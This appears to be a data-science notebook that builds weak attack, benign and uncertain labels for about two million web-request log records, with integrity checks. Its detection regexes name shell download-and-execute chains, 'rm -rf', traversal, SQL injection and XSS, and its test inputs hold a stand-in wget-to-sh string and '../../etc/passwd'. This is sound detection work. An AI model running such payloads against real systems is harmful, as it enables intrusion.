# Practical 4-Confidence-Aware Weak Labeling

## Aim

To construct explainable provisional labels from multiple cybersecurity evidence
sources while preserving uncertainty and avoiding false ground-truth claims.

## Label Model

The source dataset contains no authoritative attack/benign labels. Therefore,
labels created here are weak labels rather than verified ground truth.

Each record will receive:

- `weak_label`: attack, benign, or uncertain
- `label_confidence`: strength of supporting evidence
- `evidence_codes`: rules that contributed to the decision
- `label_version`: version of the labeling policy

The uncertain class is an abstention mechanism. A browser-like user-agent alone
will not be treated as proof of benign activity, and a frequently occurring IP
alone will not be treated as proof of attack.

In [1]:
from pathlib import Path
import json
import sys

import pandas as pd

PROJECT_ROOT = (
    Path.cwd().parent
    if Path.cwd().name == "notebooks"
    else Path.cwd()
)

if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.provenance import calculate_file_sha256

CLEANED_PATH = (
    PROJECT_ROOT / "data" / "processed" / "cj_cleaned.csv"
)

CLEANING_MANIFEST_PATH = (
    PROJECT_ROOT
    / "data"
    / "processed"
    / "cj_cleaning_manifest.json"
)

NULL_SENTINEL = r"\N"
CHUNK_SIZE = 100_000
LABEL_VERSION = "weak-label-v1"

assert CLEANED_PATH.exists()
assert CLEANING_MANIFEST_PATH.exists()

with CLEANING_MANIFEST_PATH.open(
    "r",
    encoding="utf-8",
) as file:
    cleaning_manifest = json.load(file)

actual_hash = calculate_file_sha256(CLEANED_PATH)

assert actual_hash == cleaning_manifest["output_sha256"]

LABEL_CLASSES = (
    "attack",
    "benign",
    "uncertain",
)

print("Input:", CLEANED_PATH.relative_to(PROJECT_ROOT).as_posix())
print("Records:", f"{cleaning_manifest['output_rows']:,}")
print("Fingerprint verified:", True)
print("Label classes:", LABEL_CLASSES)
print("Policy version:", LABEL_VERSION)

Input: data/processed/cj_cleaned.csv
Records: 2,062,361
Fingerprint verified: True
Label classes: ('attack', 'benign', 'uncertain')
Policy version: weak-label-v1


## 1. Candidate Evidence Inventory

Candidate indicators are measured independently before creating labeling rules.
A self-declared scanner user-agent is evidence, but not ground truth, because
user-agent values can be spoofed. Browser-style user-agents are also not proof
of benign activity.

In [2]:
EVIDENCE_NAMES = [
    "UA_GOBUSTER",
    "UA_DIRBUSTER",
    "UA_NMAP",
    "UA_ZGRAB",
    "UA_OTHER_SCANNER",
    "UA_BROWSER_STYLE",
    "UA_MISSING",
    "PAYLOAD_SHELL_CHAIN",
    "PAYLOAD_PATH_TRAVERSAL",
    "PAYLOAD_SQLI_PATTERN",
    "PAYLOAD_XSS_PATTERN",
]

evidence_counts = pd.Series(
    0,
    index=EVIDENCE_NAMES,
    dtype="int64",
)

total_records = 0

inspection_columns = [
    "user_agent",
    "category_type",
    "sub_key",
    "language",
    "metadata",
]

for chunk in pd.read_csv(
    CLEANED_PATH,
    usecols=inspection_columns,
    dtype=str,
    keep_default_na=False,
    na_values=[NULL_SENTINEL],
    chunksize=CHUNK_SIZE,
):
    total_records += len(chunk)

    user_agent = chunk["user_agent"].fillna("")

    payload_text = chunk["category_type"].fillna("")

    for column in ["sub_key", "language", "metadata"]:
        payload_text = payload_text.str.cat(
            chunk[column].fillna(""),
            sep=" ",
        )

    evidence_masks = {
        "UA_GOBUSTER": user_agent.str.contains(
            "gobuster",
            case=False,
            regex=False,
        ),
        "UA_DIRBUSTER": user_agent.str.contains(
            "dirbuster",
            case=False,
            regex=False,
        ),
        "UA_NMAP": user_agent.str.contains(
            "nmap scripting engine",
            case=False,
            regex=False,
        ),
        "UA_ZGRAB": user_agent.str.contains(
            "zgrab",
            case=False,
            regex=False,
        ),
        "UA_OTHER_SCANNER": user_agent.str.contains(
            r"(?:sqlmap|nikto|masscan|nuclei|wpscan|ffuf)",
            case=False,
            regex=True,
        ),
        "UA_BROWSER_STYLE": user_agent.str.startswith(
            ("Mozilla/", "Opera/")
        ),
        "UA_MISSING": chunk["user_agent"].isna()
        | user_agent.eq(""),
        "PAYLOAD_SHELL_CHAIN": payload_text.str.contains(
            r"(?:rm(?:_|\s)+-rf|"
            r"(?:wget|curl)(?:_|\s)+[^;|&]*"
            r"(?:;|%3b)(?:_|\s)*(?:sh|bash))",
            case=False,
            regex=True,
        ),
        "PAYLOAD_PATH_TRAVERSAL": payload_text.str.contains(
            r"(?:\.\./|%2e%2e(?:%2f|/))",
            case=False,
            regex=True,
        ),
        "PAYLOAD_SQLI_PATTERN": payload_text.str.contains(
            r"(?:union(?:_|\s)+select|"
            r"(?:%27|')(?:_|\s)*(?:or|and)"
            r"(?:_|\s)+\d+(?:_|\s)*=(?:_|\s)*\d+)",
            case=False,
            regex=True,
        ),
        "PAYLOAD_XSS_PATTERN": payload_text.str.contains(
            r"(?:<script|%3cscript)",
            case=False,
            regex=True,
        ),
    }

    for evidence_name, mask in evidence_masks.items():
        evidence_counts[evidence_name] += int(mask.sum())

evidence_profile = evidence_counts.to_frame("record_count")

evidence_profile["coverage_percent"] = (
    evidence_profile["record_count"]
    / total_records
    * 100
)

print("Records inspected:", f"{total_records:,}")
display(
    evidence_profile.sort_values(
        "record_count",
        ascending=False,
    )
)

Records inspected: 2,062,361


,record_count,coverage_percent
UA_GOBUSTER,1409399,68.339103
UA_DIRBUSTER,398116,19.303895
UA_BROWSER_STYLE,213312,10.343097
UA_MISSING,26153,1.268110
UA_NMAP,9206,0.446382
UA_OTHER_SCANNER,7504,0.363855
UA_ZGRAB,4219,0.204571
PAYLOAD_PATH_TRAVERSAL,891,0.043203
PAYLOAD_XSS_PATTERN,749,0.036318
PAYLOAD_SHELL_CHAIN,654,0.031711


In [6]:
from src.labeling import (
    LABEL_COLUMNS,
    LABEL_VERSION,
    apply_weak_labels,
    detect_candidate_evidence,
)

In [ ]:
ua_groups = [
    "declared_scanner",
    "browser_style_only",
    "missing_user_agent",
    "other_user_agent",
]

payload_columns = [
    "payload_pattern",
    "no_payload_pattern",
]

overlap_table = pd.DataFrame(
    0,
    index=ua_groups,
    columns=payload_columns,
    dtype="int64",
)

scanner_browser_overlap = 0

for chunk in pd.read_csv(
    CLEANED_PATH,
    usecols=inspection_columns,
    dtype=str,
    keep_default_na=False,
    na_values=[NULL_SENTINEL],
    chunksize=CHUNK_SIZE,
):
    evidence = detect_candidate_evidence(chunk)

    scanner = evidence["declared_scanner"]
    browser = evidence["browser_style"]
    missing = evidence["missing_user_agent"]
    payload = evidence["payload_attack_pattern"]

    scanner_browser_overlap += int(
        (scanner & browser).sum()
    )

    group_masks = {
        "declared_scanner": scanner,
        "browser_style_only": browser & ~scanner,
        "missing_user_agent": missing,
        "other_user_agent": (
            ~scanner & ~browser & ~missing
        ),
    }

    for group_name, group_mask in group_masks.items():
        overlap_table.loc[
            group_name,
            "payload_pattern",
        ] += int((group_mask & payload).sum())

        overlap_table.loc[
            group_name,
            "no_payload_pattern",
        ] += int((group_mask & ~payload).sum())

overlap_table["total"] = overlap_table.sum(axis=1)

overlap_table["payload_rate_percent"] = (
    overlap_table["payload_pattern"]
    / overlap_table["total"]
    * 100
)

print(
    "Scanner and browser-style overlap:",
    f"{scanner_browser_overlap:,}",
)

display(overlap_table)

In [ ]:
partial_client_profiles = []

profile_columns = [
    "client_ip",
    "timestamp",
    *inspection_columns,
]

for chunk in pd.read_csv(
    CLEANED_PATH,
    usecols=profile_columns,
    dtype=str,
    keep_default_na=False,
    na_values=[NULL_SENTINEL],
    chunksize=CHUNK_SIZE,
):
    evidence = detect_candidate_evidence(chunk)

    profile_chunk = pd.DataFrame({
        "client_ip": chunk["client_ip"],
        "event_time": pd.to_datetime(
            chunk["timestamp"],
            format="%Y-%m-%d %H:%M:%S",
            errors="raise",
        ),
        "scanner_events": (
            evidence["declared_scanner"].astype("int64")
        ),
        "payload_events": (
            evidence["payload_attack_pattern"].astype("int64")
        ),
        "browser_only_events": (
            (
                evidence["browser_style"]
                & ~evidence["declared_scanner"]
            ).astype("int64")
        ),
    })

    partial_profile = profile_chunk.groupby(
        "client_ip",
        sort=False,
    ).agg(
        event_count=("client_ip", "size"),
        first_event=("event_time", "min"),
        last_event=("event_time", "max"),
        scanner_events=("scanner_events", "sum"),
        payload_events=("payload_events", "sum"),
        browser_only_events=("browser_only_events", "sum"),
    )

    partial_client_profiles.append(partial_profile)

client_profile = (
    pd.concat(partial_client_profiles)
    .groupby(level=0)
    .agg(
        event_count=("event_count", "sum"),
        first_event=("first_event", "min"),
        last_event=("last_event", "max"),
        scanner_events=("scanner_events", "sum"),
        payload_events=("payload_events", "sum"),
        browser_only_events=("browser_only_events", "sum"),
    )
)

client_profile["active_span_hours"] = (
    client_profile["last_event"]
    - client_profile["first_event"]
).dt.total_seconds() / 3_600

client_profile["scanner_ratio"] = (
    client_profile["scanner_events"]
    / client_profile["event_count"]
)

client_profile["payload_ratio"] = (
    client_profile["payload_events"]
    / client_profile["event_count"]
)

client_profile["browser_only_ratio"] = (
    client_profile["browser_only_events"]
    / client_profile["event_count"]
)

client_profile["has_scanner_evidence"] = (
    client_profile["scanner_events"] > 0
)

client_profile["has_payload_evidence"] = (
    client_profile["payload_events"] > 0
)

client_profile["has_browser_only_evidence"] = (
    client_profile["browser_only_events"] > 0
)

evidence_combinations = (
    client_profile.groupby(
        [
            "has_scanner_evidence",
            "has_payload_evidence",
            "has_browser_only_evidence",
        ],
        dropna=False,
    )
    .agg(
        client_count=("event_count", "size"),
        record_count=("event_count", "sum"),
    )
    .sort_values("record_count", ascending=False)
)

assert client_profile["event_count"].sum() == 2_062_361

print("Unique clients:", f"{len(client_profile):,}")
display(evidence_combinations)

display(
    client_profile["event_count"]
    .describe(
        percentiles=[0.50, 0.75, 0.90, 0.95, 0.99]
    )
    .to_frame()
)

## 2. Weak-Label Decision Policy

Client-level aggregation is used only to understand dataset behaviour. Version 1
labels use event-local evidence and do not propagate labels through a client's
complete history.

### Decision precedence

| Condition | Weak label | Confidence | Reason |
|---|---|---:|---|
| Explicit payload pattern and scanner UA | attack | 0.99 | Two attack-evidence families agree |
| Explicit payload pattern | attack | 0.95 | Payload semantics provide strong evidence |
| Self-declared scanner UA | attack | 0.85 | Strong reconnaissance evidence, but spoofable |
| Browser-style UA with no attack evidence | benign | 0.55 | Weak benign-like evidence only |
| Missing or other UA with no attack evidence | uncertain | 0.00 | Insufficient evidence |

Browser-style records are provisional benign examples, not verified benign
ground truth. Any payload or scanner evidence overrides browser appearance.

The confidence values are policy scores, not statistically calibrated
probabilities.

### Causal constraint

Future versions may use client history, but only evidence occurring before the
event and inside a bounded time window. Full-history propagation is prohibited.

In [7]:
synthetic_records = pd.DataFrame({
    "user_agent": [
        "gobuster/3.6",
        "Mozilla/5.0",
        "Mozilla/5.0",
        None,
        "CustomClient/1.0",
        "gobuster/3.6",
    ],
    "category_type": [
        None,
        None,
        "x;wget_http://example.invalid/a;sh_payload",
        None,
        None,
        None,
    ],
    "sub_key": [
        None,
        None,
        None,
        None,
        None,
        "../../etc/passwd",
    ],
    "language": [None] * 6,
    "metadata": [None] * 6,
})

labeled_synthetic = apply_weak_labels(
    synthetic_records
)

expected_labels = [
    "attack",     # scanner only
    "benign",     # browser only
    "attack",     # browser plus payload
    "uncertain",  # missing user-agent
    "uncertain",  # unmatched evidence
    "attack",     # scanner plus payload
]

expected_confidence = [
    0.85,
    0.55,
    0.95,
    0.00,
    0.00,
    0.99,
]

expected_conflicts = [
    False,
    False,
    True,
    False,
    False,
    False,
]

assert (
    labeled_synthetic["weak_label"].tolist()
    == expected_labels
)

assert (
    labeled_synthetic["label_confidence"].tolist()
    == expected_confidence
)

assert (
    labeled_synthetic["label_conflict"].tolist()
    == expected_conflicts
)

assert (
    labeled_synthetic["label_version"]
    .eq(LABEL_VERSION)
    .all()
)

assert "PAYLOAD_SHELL" in (
    labeled_synthetic.loc[2, "evidence_codes"]
)

assert "PAYLOAD_PATH_TRAVERSAL" in (
    labeled_synthetic.loc[5, "evidence_codes"]
)

pd.testing.assert_frame_equal(
    synthetic_records,
    labeled_synthetic[list(synthetic_records.columns)],
)

relabeled_synthetic = apply_weak_labels(
    labeled_synthetic
)

pd.testing.assert_frame_equal(
    labeled_synthetic,
    relabeled_synthetic,
)

print("Decision branches: passed")
print("Conflict detection: passed")
print("Original evidence preservation: passed")
print("Labeling idempotence: passed")

display(
    labeled_synthetic[
        [
            "weak_label",
            "label_confidence",
            "evidence_codes",
            "evidence_count",
            "label_conflict",
            "label_version",
        ]
    ]
)

Decision branches: passed
Conflict detection: passed
Original evidence preservation: passed
Labeling idempotence: passed


,weak_label,label_confidence,evidence_codes,evidence_count,label_conflict,label_version
0,attack,0.85,UA_DECLARED_SCANNER,1,False,weak-label-v1
1,benign,0.55,UA_BROWSER_STYLE,1,False,weak-label-v1
2,attack,0.95,UA_BROWSER_STYLE|PAYLOAD_SHELL,2,True,weak-label-v1
3,uncertain,0.00,UA_MISSING,1,False,weak-label-v1
4,uncertain,0.00,NO_MATCHING_EVIDENCE,0,False,weak-label-v1
5,attack,0.99,UA_DECLARED_SCANNER|PAYLOAD_PATH_TRAVERSAL,2,False,weak-label-v1


In [8]:
from collections import Counter

joint_label_counts = Counter()
evidence_count_distribution = Counter()
conflict_count = 0
preflight_rows = 0

for chunk in pd.read_csv(
    CLEANED_PATH,
    usecols=inspection_columns,
    dtype=str,
    keep_default_na=False,
    na_values=[NULL_SENTINEL],
    chunksize=CHUNK_SIZE,
):
    labeled_chunk = apply_weak_labels(chunk)

    joint_counts = (
        labeled_chunk.groupby(
            ["weak_label", "label_confidence"]
        )
        .size()
    )

    for key, count in joint_counts.items():
        label, confidence = key
        joint_label_counts[
            (str(label), float(confidence))
        ] += int(count)

    evidence_count_distribution.update(
        labeled_chunk["evidence_count"]
        .value_counts()
        .to_dict()
    )

    conflict_count += int(
        labeled_chunk["label_conflict"].sum()
    )

    preflight_rows += len(labeled_chunk)

assert preflight_rows == 2_062_361

joint_distribution = pd.DataFrame(
    [
        {
            "weak_label": label,
            "label_confidence": confidence,
            "record_count": count,
        }
        for (label, confidence), count
        in joint_label_counts.items()
    ]
).sort_values(
    ["weak_label", "label_confidence"],
    ascending=[True, False],
)

joint_distribution["coverage_percent"] = (
    joint_distribution["record_count"]
    / preflight_rows
    * 100
)

class_distribution = (
    joint_distribution.groupby(
        "weak_label",
        as_index=False,
    )["record_count"]
    .sum()
)

class_distribution["coverage_percent"] = (
    class_distribution["record_count"]
    / preflight_rows
    * 100
)

print("Preflight rows:", f"{preflight_rows:,}")
print("Conflict records:", f"{conflict_count:,}")

print("\nClass distribution:")
display(class_distribution)

print("\nLabel and confidence distribution:")
display(joint_distribution)

print(
    "Evidence-count distribution:",
    dict(sorted(evidence_count_distribution.items())),
)

Preflight rows: 2,062,361
Conflict records: 21,728

Class distribution:


,weak_label,record_count,coverage_percent
0,attack,1830340,88.749739
1,benign,191584,9.289547
2,uncertain,40437,1.960714



Label and confidence distribution:


,weak_label,label_confidence,record_count,coverage_percent
2,attack,0.99,522,0.025311
1,attack,0.95,1896,0.091933
0,attack,0.85,1827922,88.632495
3,benign,0.55,191584,9.289547
4,uncertain,0.00,40437,1.960714


Evidence-count distribution: {0: 14334, 1: 2026249, 2: 21256, 3: 522}


### Preflight Interpretation

The label distribution is strongly imbalanced and dominated by scanner
user-agent evidence. Only 2,418 records contain explicit payload evidence.

The 191,584 benign records are low-confidence benign-like examples, not verified
benign ground truth. A total of 40,437 records remain uncertain rather than being
forced into a binary class.

Direct labeling indicators must be excluded from the primary ML feature set to
prevent rule leakage. They may be used separately as a transparent baseline.

In [11]:
from datetime import datetime, timezone
from collections import Counter

LABELS_OUTPUT = (
    PROJECT_ROOT / "data" / "labels" / "cj_weak_labels.csv"
)

LABELS_MANIFEST_OUTPUT = (
    PROJECT_ROOT
    / "data"
    / "labels"
    / "cj_weak_labels_manifest.json"
)

LABELS_OUTPUT.parent.mkdir(parents=True, exist_ok=True)

LABEL_ID_COLUMNS = [
    "event_id",
    "record_hash",
]

LABEL_OUTPUT_COLUMNS = [
    *LABEL_ID_COLUMNS,
    *LABEL_COLUMNS,
]


def export_weak_labels():
    output_partial = LABELS_OUTPUT.with_name(
        LABELS_OUTPUT.name + ".partial"
    )
    manifest_partial = LABELS_MANIFEST_OUTPUT.with_name(
        LABELS_MANIFEST_OUTPUT.name + ".partial"
    )

    if LABELS_OUTPUT.exists() or LABELS_MANIFEST_OUTPUT.exists():
        raise FileExistsError(
            "Final label artifacts already exist."
        )

    for path in [output_partial, manifest_partial]:
        if path.exists():
            path.unlink()

    label_counts = Counter()
    joint_counts = Counter()

    input_rows = 0
    output_rows = 0
    conflict_records = 0
    chunk_count = 0
    write_header = True

    try:
        for chunk in pd.read_csv(
            CLEANED_PATH,
            usecols=[
                *LABEL_ID_COLUMNS,
                *inspection_columns,
            ],
            dtype=str,
            keep_default_na=False,
            na_values=[NULL_SENTINEL],
            chunksize=CHUNK_SIZE,
        ):
            labeled_chunk = apply_weak_labels(chunk)

            sidecar_chunk = labeled_chunk[
                LABEL_OUTPUT_COLUMNS
            ].copy()

            if (
                sidecar_chunk["event_id"].isna().any()
                or sidecar_chunk["event_id"].eq("").any()
            ):
                raise RuntimeError(
                    "A label row has no event ID."
                )

            sidecar_chunk.to_csv(
                output_partial,
                mode="w" if write_header else "a",
                header=write_header,
                index=False,
                na_rep=NULL_SENTINEL,
            )

            label_counts.update(
                sidecar_chunk["weak_label"]
                .value_counts()
                .to_dict()
            )

            for key, count in (
                sidecar_chunk.groupby(
                    ["weak_label", "label_confidence"]
                )
                .size()
                .items()
            ):
                label, confidence = key
                joint_counts[
                    (str(label), float(confidence))
                ] += int(count)

            conflict_records += int(
                sidecar_chunk["label_conflict"].sum()
            )

            input_rows += len(chunk)
            output_rows += len(sidecar_chunk)
            chunk_count += 1
            write_header = False

        if input_rows != output_rows:
            raise RuntimeError(
                "Input and label row counts differ."
            )

        output_sha256 = calculate_file_sha256(
            output_partial
        )

        labeling_code_path = (
            PROJECT_ROOT / "src" / "labeling.py"
        )

        manifest = {
            "created_at_utc": datetime.now(
                timezone.utc
            ).isoformat(),
            "input_file": CLEANED_PATH.relative_to(
                PROJECT_ROOT
            ).as_posix(),
            "output_file": LABELS_OUTPUT.relative_to(
                PROJECT_ROOT
            ).as_posix(),
            "input_sha256": cleaning_manifest[
                "output_sha256"
            ],
            "output_sha256": output_sha256,
            "input_rows": input_rows,
            "output_rows": output_rows,
            "chunk_count": chunk_count,
            "chunk_size": CHUNK_SIZE,
            "label_version": LABEL_VERSION,
            "label_scope": "event_local",
            "client_history_propagation": False,
            "label_columns": LABEL_OUTPUT_COLUMNS,
            "class_distribution": {
                str(label): int(count)
                for label, count in label_counts.items()
            },
            "confidence_distribution": {
                f"{label}|{confidence:.2f}": int(count)
                for (label, confidence), count
                in joint_counts.items()
            },
            "conflict_records": conflict_records,
            "labeling_code_file": labeling_code_path.relative_to(
                PROJECT_ROOT
            ).as_posix(),
            "labeling_code_sha256": calculate_file_sha256(
                labeling_code_path
            ),
        }

        with manifest_partial.open(
            "w",
            encoding="utf-8",
        ) as file:
            json.dump(manifest, file, indent=2)

        output_partial.replace(LABELS_OUTPUT)
        manifest_partial.replace(LABELS_MANIFEST_OUTPUT)

        return manifest

    except Exception:
        for path in [output_partial, manifest_partial]:
            if path.exists():
                path.unlink()
        raise

def load_or_export_weak_labels():
    output_exists = LABELS_OUTPUT.exists()
    manifest_exists = LABELS_MANIFEST_OUTPUT.exists()

    if output_exists != manifest_exists:
        raise RuntimeError(
            "Incomplete label artifact set: CSV and manifest "
            "must both exist or both be absent."
        )

    if not output_exists:
        print("Creating weak-label sidecar...")
        return export_weak_labels()

    with LABELS_MANIFEST_OUTPUT.open(
        "r",
        encoding="utf-8",
    ) as file:
        existing_manifest = json.load(file)

    labeling_code_path = (
        PROJECT_ROOT / "src" / "labeling.py"
    )

    actual_input_hash = calculate_file_sha256(
        CLEANED_PATH
    )
    actual_output_hash = calculate_file_sha256(
        LABELS_OUTPUT
    )
    actual_code_hash = calculate_file_sha256(
        labeling_code_path
    )

    if actual_input_hash != existing_manifest["input_sha256"]:
        raise RuntimeError(
            "Cleaned input changed after labels were generated."
        )

    if actual_output_hash != existing_manifest["output_sha256"]:
        raise RuntimeError(
            "Label-sidecar fingerprint verification failed."
        )

    if actual_code_hash != existing_manifest[
        "labeling_code_sha256"
    ]:
        raise RuntimeError(
            "Labeling code changed after labels were generated. "
            "A new label version is required."
        )

    if existing_manifest["label_version"] != LABEL_VERSION:
        raise RuntimeError(
            "Manifest and code label versions differ."
        )

    print("Reusing verified weak-label sidecar.")
    return existing_manifest


label_export_result = load_or_export_weak_labels()
label_export_result

Reusing verified weak-label sidecar.


{'created_at_utc': '2026-08-19T05:49:32.136508+00:00',
 'input_file': 'data/processed/cj_cleaned.csv',
 'output_file': 'data/labels/cj_weak_labels.csv',
 'input_sha256': 'c022cee1cb2de32f7bb1db1d38d5d1dad1079b2fb590f854f9aead7fa54995f2',
 'output_sha256': '17e6c785c07056fd973957192653c0fb97706477477c2ac009c9c5691857e444',
 'input_rows': 2062361,
 'output_rows': 2062361,
 'chunk_count': 21,
 'chunk_size': 100000,
 'label_version': 'weak-label-v1',
 'label_scope': 'event_local',
 'client_history_propagation': False,
 'label_columns': ['event_id',
  'record_hash',
  'weak_label',
  'label_confidence',
  'evidence_codes',
  'evidence_count',
  'label_conflict',
  'label_version'],
 'class_distribution': {'benign': 191584,
  'uncertain': 40437,
  'attack': 1830340},
 'confidence_distribution': {'attack|0.85': 1827922,
  'attack|0.95': 1896,
  'attack|0.99': 522,
  'benign|0.55': 191584,
  'uncertain|0.00': 40437},
 'conflict_records': 21728,
 'labeling_code_file': 'src/labeling.py',
 'label

## Independent sidecar verification

The label sidecar is verified against the cleaned dataset chunk by chunk.

This checks:

- exact `event_id` and `record_hash` alignment;
- valid label–confidence combinations;
- evidence-count consistency;
- manifest totals;
- absence of incomplete `.partial` artifacts.

`record_hash` is not required to be unique because identical events may legitimately occur multiple times.

In [12]:
from collections import Counter
from itertools import zip_longest

manifest = label_export_result
sidecar_columns = manifest["label_columns"]

cleaned_chunks = pd.read_csv(
    CLEANED_PATH,
    usecols=["event_id", "record_hash"],
    dtype=str,
    keep_default_na=False,
    chunksize=CHUNK_SIZE,
)

label_chunks = pd.read_csv(
    LABELS_OUTPUT,
    usecols=sidecar_columns,
    dtype=str,
    keep_default_na=False,
    chunksize=CHUNK_SIZE,
)

allowed_label_confidence = {
    ("attack", 0.85),
    ("attack", 0.95),
    ("attack", 0.99),
    ("benign", 0.55),
    ("uncertain", 0.00),
}

class_counts = Counter()
confidence_counts = Counter()
verified_rows = 0
conflict_records = 0

missing_chunk = object()

for chunk_number, (cleaned_chunk, label_chunk) in enumerate(
    zip_longest(
        cleaned_chunks,
        label_chunks,
        fillvalue=missing_chunk,
    ),
    start=1,
):
    if cleaned_chunk is missing_chunk or label_chunk is missing_chunk:
        raise RuntimeError("Cleaned file and label sidecar have different chunk counts.")

    if len(cleaned_chunk) != len(label_chunk):
        raise RuntimeError(
            f"Row-count mismatch in chunk {chunk_number}."
        )

    cleaned_identity = cleaned_chunk[
        ["event_id", "record_hash"]
    ].reset_index(drop=True)

    label_identity = label_chunk[
        ["event_id", "record_hash"]
    ].reset_index(drop=True)

    if not cleaned_identity.equals(label_identity):
        mismatch = (
            cleaned_identity != label_identity
        ).any(axis=1)

        first_mismatch = mismatch.idxmax()

        raise RuntimeError(
            f"Identity mismatch in chunk {chunk_number}, "
            f"local row {first_mismatch}."
        )

    if label_chunk[sidecar_columns].eq("").any().any():
        raise RuntimeError(
            f"Unexpected empty label field in chunk {chunk_number}."
        )

    if label_chunk[sidecar_columns].eq(NULL_SENTINEL).any().any():
        raise RuntimeError(
            f"Unexpected null label field in chunk {chunk_number}."
        )

    if set(label_chunk["label_version"]) != {LABEL_VERSION}:
        raise RuntimeError(
            f"Unexpected label version in chunk {chunk_number}."
        )

    confidence = pd.to_numeric(
        label_chunk["label_confidence"],
        errors="raise",
    )

    evidence_count = pd.to_numeric(
        label_chunk["evidence_count"],
        errors="raise",
    )

    if (evidence_count % 1 != 0).any():
        raise RuntimeError("Evidence count contains a non-integer value.")

    evidence_count = evidence_count.astype(int)

    observed_pairs = set(
        zip(
            label_chunk["weak_label"],
            confidence.round(2),
        )
    )

    if not observed_pairs.issubset(allowed_label_confidence):
        raise RuntimeError(
            f"Invalid label-confidence combination: "
            f"{observed_pairs - allowed_label_confidence}"
        )

    expected_evidence_count = (
        label_chunk["evidence_codes"].str.count(r"\|") + 1
    )

    no_evidence = (
        label_chunk["evidence_codes"]
        == "NO_MATCHING_EVIDENCE"
    )

    expected_evidence_count = expected_evidence_count.where(
        ~no_evidence,
        0,
    )

    if not expected_evidence_count.equals(evidence_count):
        raise RuntimeError(
            f"Evidence-count mismatch in chunk {chunk_number}."
        )

    conflict_text = label_chunk["label_conflict"].str.lower()

    if not set(conflict_text).issubset({"true", "false"}):
        raise RuntimeError("Invalid label_conflict value.")

    class_counts.update(label_chunk["weak_label"])

    confidence_counts.update(
        f"{label}|{score:.2f}"
        for label, score in zip(
            label_chunk["weak_label"],
            confidence,
        )
    )

    conflict_records += int((conflict_text == "true").sum())
    verified_rows += len(label_chunk)

if verified_rows != manifest["output_rows"]:
    raise RuntimeError("Verified row count differs from manifest.")

if dict(class_counts) != manifest["class_distribution"]:
    raise RuntimeError("Class distribution differs from manifest.")

if dict(confidence_counts) != manifest["confidence_distribution"]:
    raise RuntimeError("Confidence distribution differs from manifest.")

if conflict_records != manifest["conflict_records"]:
    raise RuntimeError("Conflict count differs from manifest.")

partial_paths = [
    LABELS_OUTPUT.with_name(LABELS_OUTPUT.name + ".partial"),
    LABELS_MANIFEST_OUTPUT.with_name(
        LABELS_MANIFEST_OUTPUT.name + ".partial"
    ),
]

remaining_partials = [
    str(path)
    for path in partial_paths
    if path.exists()
]

if remaining_partials:
    raise RuntimeError(
        f"Incomplete artifacts remain: {remaining_partials}"
    )

print(f"Verified rows: {verified_rows:,}")
print("Event-ID and record-hash alignment: passed")
print("Label-confidence policy: passed")
print("Evidence-count consistency: passed")
print("Manifest reconciliation: passed")
print("Partial files remaining: 0")

Verified rows: 2,062,361
Event-ID and record-hash alignment: passed
Label-confidence policy: passed
Evidence-count consistency: passed
Manifest reconciliation: passed
Partial files remaining: 0
